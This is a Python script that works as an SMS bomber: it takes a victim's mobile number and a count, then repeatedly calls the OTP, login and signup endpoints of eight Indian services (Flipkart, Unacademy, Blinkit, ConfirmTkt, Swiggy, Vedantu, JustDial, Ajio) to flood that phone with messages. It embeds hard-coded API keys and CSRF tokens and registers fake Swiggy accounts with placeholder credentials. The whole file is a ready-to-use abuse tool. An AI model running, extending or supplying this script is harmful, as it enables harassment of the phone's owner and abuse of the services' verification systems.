import json
import requests as rq
import random

mobno = input("Enter mobile number: ")
quantity = int(input("Enter no of messages: "))



def flipkart_api():
	url = 'https://1.rome.api.flipkart.com/api/7/user/otp/generate'

	_headers = {
		'Host': '1.rome.api.flipkart.com',
		'User':'Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0',
		'Accept': '*/*',
		'Accept':'Language: en-US,en;q=0.5',
		'Accept':'Encoding: gzip, deflate, br',
		'Content':'Type: application/json',
		'X-User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0 FKUA/website/42/website/Desktop',
		'Origin': 'https://www.flipkart.com',
		'Sec-Fetch-Dest': 'empty',
		'Sec-Fetch-Mode': 'cors',
		'Sec-Fetch-Site': 'same-site',
		'Referer': 'https://www.flipkart.com/',
		'Connection': 'keep-alive',
		'Content-Type': 'application/json',

	}



	data = {"loginId":"+91"+mobno}
	
	request = rq.post(url, headers=_headers, json=data)

	if request.status_code == 200:
		print('Success - Flipkart')
	else:
		print('Failed - Flipkart')


def unacademy_api():
	url = 'https://unacademy.com/api/v3/user/user_check/'



	_headers = {
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0',
	'Accept': '*/*',
	'Accept-Language': 'en-US,en;q=0.5',
	'Accept-Encoding': 'gzip, deflate, br',
	'Content-Type': 'application/json',
	'Content-Length': '107',
	'x-platform': '0',
	'Origin': 'https://unacademy.com',
	'Sec-Fetch-Dest': 'empty',
	'Sec-Fetch-Mode': 'cors',
	'Sec-Fetch-Site': 'same-origin',
	'Referer': 'https://unacademy.com/',
	'Connection': 'keep-alive',
	}


	data = {"phone":""+mobno,"country_code":"IN","otp_type":1,"email":"","send_otp":'true',"is_un_teach_user":'false'}

	request = rq.post(url,headers=_headers,json=data)

	if request.status_code == 200:
		print('Success - Unacademy')
	else:
		print('Failed - Unacademy')


def grofers_api():
	url = 'https://blinkit.com/v2/accounts/'

	_headers = {
		'auth_key':'15dbeedc29f8252229be1af586c485065c3c5b8d939d41f8aaae53ff14795b07',
		'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0'
	}

	data = {
		'user_phone':""+mobno
	}


	request = rq.post(url,headers=_headers,data=data)

	if request.status_code == 200:
		print('Success - Grofers')
		return True
	else:
		print('Failed - Grofers')
		return False


def confirmtkt_api():
	url = 'https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber='+mobno+'&newOtp=true&retry=false&testparamsp=true'
	
	requests = rq.get(url)
	
	if requests.json()['smsSent'] == False:
		print('Failed - Confirmtkt')
	else:
		print('Success - Confirmtkt')


def swiggy_api():
	url = 'https://www.swiggy.com/dapi/auth/sms-otp'
	
	_headers = {
	'Host': 'www.swiggy.com',
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0',
	'Accept': '*/*',
	'Accept-Language': 'en-US,en;q=0.5',
	'Accept-Encoding': 'gzip, deflate, br',
	'Referer': 'https://www.swiggy.com/',
	'Content-Type': 'application/json',
	'__fetch_req__': 'true',
	'Origin': 'https://www.swiggy.com',
	'Content-Length': '74',
	'Connection': 'keep-alive',
	}

	data = {"mobile":""+mobno,"_csrf":"8Nq9O994FV5N-pweL6TC2U2cGw67V6RKmVbYBE6M"}

	request = rq.post(url,headers=_headers,json=data)

	if request.json()['statusCode'] == 1:
		url = 'https://www.swiggy.com/dapi/auth/signup'

		_headers = {
			'Host': 'www.swiggy.com',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0',
			'Accept': '*/*',
			'Accept-Language': 'en-US,en;q=0.5',
			'Accept-Encoding': 'gzip, deflate, br',
			'Referer': 'https://www.swiggy.com/',
			'Content-Type': 'application/json',
			'__fetch_req__': 'true',
			'Origin': 'https://www.swiggy.com',
			'Content-Length': '165',
			'Connection': 'keep-alive',
		}

		data = {"mobile":""+mobno,"name":"hello","email":"123454321@yahoo.com","password":"123454321","referral":"","otp":"","_csrf":"Y3EUNMSPJWwn-Jrfj6JoXJcCI9jzToqKqcqekwKI"}

		requests = rq.post(url,headers=_headers,json=data)

		print('Success - Swiggy')
	
	elif request.json()['statusCode'] == 0:
		print('Success')

	else:
		print('Failed - Swiggy')


def vedantu_api():
	url = 'https://user.vedantu.com/user/preLoginVerification'

	_headers = {
		'Host': 'user.vedantu.com',
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0',
		'Accept': '*/*',
		'Accept-Language': 'en-US,en;q=0.5',
		'Accept-Encoding': 'gzip, deflate, br',
		'Content-Type': 'application/json',
		'Content-Length': '84',
		'Origin': 'https://www.vedantu.com',
		'Connection': 'keep-alive',
		'Referer': 'https://www.vedantu.com/',
	}

	data = {"email":'null',"phoneCode":"+91","phoneNumber":""+mobno,"ver":"12.104"}

	requests = rq.post(url,headers=_headers,json=data)

	if requests.json()['smsSent'] == True:
		print('Success - Vedantu')
	else:
		print('Failed - Vedantu')


def justdial_api():
	url = 'https://www.justdial.com/functions/whatsappverification.php'

	_headers = {
	'Host': 'www.justdial.com',
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
	'Accept': '*/*',
	'Accept-Language': 'en-US,en;q=0.5',
	'Accept-Encoding': 'gzip, deflate, br',
	'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
	'X-FRSC-Token': '80e2947c12a2848808d20f0d959be0db55b1bf4572a9b099626a892675bd28af',
	'X-Requested-With': 'XMLHttpRequest',
	'Content-Length': '36',
	'Origin': 'https://www.justdial.com',
	'Connection': 'keep-alive',
	'Referer': 'https://www.justdial.com/',
	}


	data = {
		'mob':""+mobno
	}

	requests = rq.post(url,headers=_headers,data=data)

	if requests.json()['sent'] == True:
		print("Success - JustDial")
	else:
		print("Failed - JustDial - Rate Exceeded!")


def ajio_api():
	url = 'https://login.web.ajio.com/api/auth/generateLoginOTP'

	_headers = {
		'Host': 'login.web.ajio.com',
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
		'Accept': 'application/json',
		'Accept-Language': 'en-US,en;q=0.5',
		'Accept-Encoding': 'gzip, deflate, br',
		'Content-Type': 'application/json',
		'Content-Length': '29',
		'Origin': 'https://www.ajio.com',
		'Connection': 'keep-alive',
		'Referer': 'https://www.ajio.com/',
	}

	data = {"mobileNumber":""+mobno}

	requests = rq.post(url,headers=_headers,json=data)

	if requests.status_code == 200:
		print('Success - Ajio')
	else:
		print('Failed - Ajio')


for x in range(0,quantity):
	flipkart_api()
	unacademy_api()
	grofers_api()
	justdial_api()
	vedantu_api()
	ajio_api()
	confirmtkt_api()
	swiggy_api()
